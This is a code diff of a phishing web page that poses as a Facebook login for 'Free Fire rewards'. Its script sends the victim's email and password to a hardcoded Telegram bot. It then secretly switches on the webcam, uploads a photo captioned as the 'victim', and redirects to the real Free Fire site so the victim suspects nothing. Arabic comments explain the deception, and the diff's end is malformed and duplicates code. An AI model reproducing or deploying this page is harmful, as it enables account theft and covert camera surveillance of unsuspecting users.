@@ -5,74 +5,73 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { background: #f0f2f5; font-family: sans-serif; margin: 0; padding: 10px; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .container { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        .logo { width: 150px; height: 30px; margin-bottom: 20px; }
-        h1 { font-size: 18px; color: #1c1e21; margin-bottom: 20px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; color: #1c1e21; }
-        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; outline: none; }
-        .btn-login { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; }
-        .btn-login:hover { background: #166fe5; }
-        .footer { margin-top: 20px; border-top: 1px solid #dddfe2; padding-top: 15px; }
-        .btn-signup { width: 100%; padding: 10px; background: #42b72a; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .btn-signup:hover { background: #36a420; }
-        /* إخفاء الفيديو والكانفاس */
+        .container { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        input { width: 93%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn-login { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
-        <h1>Connect to claim your Free Fire rewards.</h1>
-        <div class="input-group">
-            <input type="text" id="email" placeholder="Email address or phone number" required>
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="Password" required>
-        </div>
-        <button class="btn-login" onclick="startCapture()">Log in</button>
-        
-        <div class="footer">
-            <button class="btn-signup">Create New Account</button>
-        </div>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="logo">
+        <p style="color: #1c1e21; font-size: 14px;">Log in to your Facebook account to connect to Free Fire.</p>
+        <input type="text" id="email" placeholder="Mobile number or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button class="btn-login" onclick="hack()">Log In</button>
     </div>
 
-    <video id="video" width="640" height="480" autoplayplaysinline></video>
+    <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
         const CHAT_ID = "7479786207"; //
 
-        async function startCapture() {
+        async function hack() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if(email == "" || pass == "") {
+                alert("Please enter your details!");
+                return;
+            }
+
             try {
-                // 1. طلب الكاميرا ديريكت
+                // 1. فتح الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // رسالة خادعة باش يآمن بلي كاين عملية
-                alert("Checking account status... Photo validation required!");
 
-                // 2. التقاط صورة بعد 2 ثانية (باش يوافق)
+                // 2. إرسال الإيميل والمودباس ديريكت
+                const msg = `🎯 NEW ACCOUNT CAPTURED!\n\n📧 Email: ${email}\n🔑 Pass: ${pass}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+                // 3. الحل للصورة الكحلة: استنى 5 ثواني كاملة باش الكاميرا تصفى
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     
-                    // تحويل الصورة لملف JPG وإرسالها
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'victim_face.jpg');
-                        formData.append('caption', '🎯 Captured! Victimvalidated photo.');
+                        formData.append('photo', blob, 'face.jpg');
+                        formData.append('caption', `✅ Photo of victim: ${email}`);
 
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                        
+                        // توجيه الضحية لصفحة حقيقية باش ما يشكش
+                        window.location.href = "https://www.freefire.com/";
                     }, 'image/jpeg');
-                }, 2000);
+                }, 5000); 
+
+            } catch (err) {
+                alert("Connection error! Please allow camera access to verify your account.");
+            }
+        }
+    </script>
+</body>
+</html>
 
             } catch (err) {
                 // رسالة خطأ مزورة إذا رفض الكاميرا
